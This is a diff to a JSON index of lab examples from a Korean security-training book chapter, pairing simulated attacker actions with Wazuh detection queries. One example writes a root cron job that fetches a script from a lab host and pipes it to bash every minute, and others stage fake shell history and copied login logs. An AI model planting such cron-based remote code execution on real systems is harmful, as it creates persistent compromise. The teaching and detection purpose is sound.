@@ -96,6 +96,14 @@
     "text": "agent.name: \"bastion\" AND syscheck.path: \"/etc/sudoers.d/99-book09-lab\" AND syscheck.event: \"modified\""
   },
   {
+    "id": "Q09-14",
+    "file": "examples/rev02/chapter09/Q09-14.txt",
+    "where": "Windows · Discover · wazuh-archives-*",
+    "document": "volume01-chapter09.json",
+    "section": "조사와 원상복구",
+    "text": "agent.name: \"bastion\"\nAND location: \"/var/log/auth.log\"\nAND predecoder.program_name: \"sudo\"\nAND full_log: *99-book09-lab*"
+  },
+  {
     "document": "volume01-chapter09.json",
     "section": "조사와 원상복구",
     "id": "C09-11",
@@ -237,7 +245,7 @@
     "id": "C09-26",
     "where": "공격자 VM · att 셸",
     "file": "examples/rev02/chapter09/C09-26.txt",
-    "text": "command -v python3\nls -ld ~/book09/www\nmkdir ~/book09/www"
+    "text": "command -v python3\nls -ld ~/book09/www\nmkdir ~/book09/www\nls -l ~/book09/www/x.sh"
   },
   {
     "document": "volume01-chapter09.json",
@@ -277,7 +285,7 @@
     "id": "C09-31",
     "where": "kt66-bastion · SSH로 접속한 ccc 셸",
     "file": "examples/rev02/chapter09/C09-31.txt",
-    "text": "printf '%s\\n' \\\n'* * * * * root /usr/bin/curl -fsS --max-time 5 http://192.168.0.108:8000/x.sh | /bin/bash' \\\n| sudo tee /etc/cron.d/book09-lab\nsudo chmod 0644 /etc/cron.d/book09-lab\ncat /etc/cron.d/book09-lab"
+    "text": "printf '%s\\n' \\\n'* * * * * root /usr/bin/curl -fsS --max-time 5 http://192.168.0.108:8000/x.sh | /bin/bash' \\\n| sudo tee /etc/cron.d/book09-lab\nsudo chmod 0644 /etc/cron.d/book09-lab\ncat /etc/cron.d/book09-lab\nsudo stat -c \"%a %U %G %n\" /etc/cron.d/book09-lab"
   },
   {
     "document": "volume01-chapter09.json",
@@ -574,6 +582,14 @@
     "where": "kt66-bastion · SSH로 접속한 ccc 셸",
     "file": "examples/rev02/chapter09/C09-62.txt",
     "text": "mkdir -m 700 /home/ccc/book09-history\nprintf '%s\\n' 'echo book09-history' \\\n> /home/ccc/book09-history/.bash_history\nsudo cp -p /var/log/btmp /var/log/book09-btmp\nls -l /home/ccc/book09-history/.bash_history \\\n/var/log/book09-btmp"
+  },
+  {
+    "id": "Q09-13",
+    "file": "examples/rev02/chapter09/Q09-13.txt",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "document": "volume01-chapter09.json",
+    "section": "감시할 실습 파일 준비",
+    "text": "agent.name: \"bastion\"\nAND syscheck.event: \"added\"\nAND syscheck.path: (\"/var/log/book09-btmp\"\nOR \"/home/ccc/book09-history/.bash_history\")"
   },
   {
     "document": "volume01-chapter09.json",
